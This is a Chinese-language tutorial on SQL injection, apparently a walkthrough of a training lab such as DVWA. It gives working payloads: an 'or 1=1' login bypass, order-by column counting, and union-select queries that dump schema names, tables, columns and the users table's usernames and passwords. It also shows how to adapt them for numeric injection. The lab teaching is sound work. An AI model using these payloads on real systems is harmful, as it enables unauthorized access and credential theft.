SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。


以上为百度百科的解释，可能不是很形象，这里举一个例子方便大家理解。


程序员开发登陆界面时考虑的场景是用户在表单中输入用户名和密码进行登陆。


当用户输入的参数传到服务器端后数据库会执行如下语句在数据库中进行查询：

SELECT COUNT(*)FROM UsersWHERE username='admin'and password='p@$$w0rd'

没想到某些了解开发的用户动了坏心思，在用户名中输入了 admin' or 1=1 --。


这就导致传递到后端的数据被错误的当做数据库语句的一部分去执行。原本数据库语句的意思是在数据库中查询输入的用户名和密码是否存在，从而判断用户可不可以登陆。而传递参数改为“admin ' or 1=1 --”后，“or 1=1”使语句中的布尔值一直为真，无论username和password的值为多少，都会登陆成功。这也就是一次SQL注入攻击。
SELECT COUNT(*)FROM UsersWHERE username='admin' or 1=1 -- 'and password='1'

注意：如果直接复制语句进行注入失败的话，请重新手动写一遍，要注意所有符号都为英文符号而不是中文！


用户输入id后页面会显示信息，凡是后端与数据库存在交互就可能存在SQL注入漏洞。我们使用如下语句进行注入：

1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

注入后发现页面出现错误信息：


这个问题是由于字段编码不同导致的，可以通过下载新版本的数据库来解决该问题。如果说是在实际渗透测试中遇到该问题，可以通过将输出数据的编码改为十六进制进行输出。也就是将查询的数据放在hex()的括号中即可，如下：
1' union select 1,group_concat(hex(table_name)) from information_schema.tables where table_schema=database() #


接下来说一下SQL注入的具体步骤。


1. 首先是判断闭合符号。闭合符号根据数据库语句中所使用的的符号而变化，常见的有以下七种，注入时挨个尝试根据页面回显来进行判断。

' " 无闭合符号 ) ') ") ')

2. 使用order by猜测字段数。


3. 使用union拼接select语句进行联合查询。


4. 爆库，爆表，爆字段，拿数据。

0' order by 3 ## 判断字段数 0' union select database(),version() ## 查询当前所在的数据库和数据库版本0' union select 1, group_concat(schema_name) from information_schema.schemata ##  查询该数据库中的所有库的名称，简称爆库0' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() ## 查询当前数据库中的所有表的名称0' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' #    # 查询users表下的所有字段名0' union  select user,password from users ## 查询user和password字段的信息

注：get型请求和post型请求的区别是get型在url中传递参数，post型在请求体中传递。


打开Burpsuite拦截提交的请求包，输入 1' order by 2 # 进行测试,发现注入失败。


查看代码后发现为数字型注入。


下图为字符型注入，数字型的没有闭合符号，字符型的有闭合符号。


所以我们将原来的闭合符号删掉即可完成注入。

1 order by 2 #

其他语句也是一样的将闭合符号去掉，参考low安全等级下的payload。
